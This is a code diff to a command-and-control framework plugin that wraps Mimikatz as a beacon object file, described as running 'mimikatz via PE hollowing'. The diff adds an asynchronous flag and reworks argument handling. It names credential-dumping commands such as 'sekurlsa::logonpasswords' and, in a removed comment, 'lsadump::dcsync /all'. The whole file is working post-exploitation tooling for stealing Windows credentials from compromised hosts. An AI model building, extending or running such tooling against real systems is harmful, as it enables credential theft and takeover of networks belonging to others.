@@ -9,18 +9,17 @@ var cmd_bofkatz = ax.create_command(
     "bofkatz sekurlsa::logonpasswords"
 );
 
+cmd_bofkatz.addArgBool("--async", "Run BOF asynchronously (recommended for long-running mimikatz commands)");
 cmd_bofkatz.addArgString("arguments", false, "Mimikatz arguments (default: coffee exit)");
 
 cmd_bofkatz.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
-    let args = parsed_json["arguments"] || "";
-    // Mimikatz splits argv on spaces — wrap in quotes so flags stay with command
-    // e.g. lsadump::dcsync /all → "lsadump::dcsync /all" as single argv token
-    if (args.includes(" ")) {
-        args = '"' + args + '"';
-    }
+    let args = (parsed_json["arguments"] || "").trim();
+    if (!args.endsWith("exit")) args = args ? args + " exit" : "coffee exit";
+    let async = "";
+    if (parsed_json["--async"]) async = "-a ";
     let bof_params = ax.bof_pack("cstr", [args]);
     let bof_path = ax.script_dir() + "BOFKatz." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOFKatz: mimikatz via PE hollowing");
+    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOFKatz: mimikatz via PE hollowing");
 });
 
 var group = ax.create_commands_group("BOFKatz", [cmd_bofkatz]);
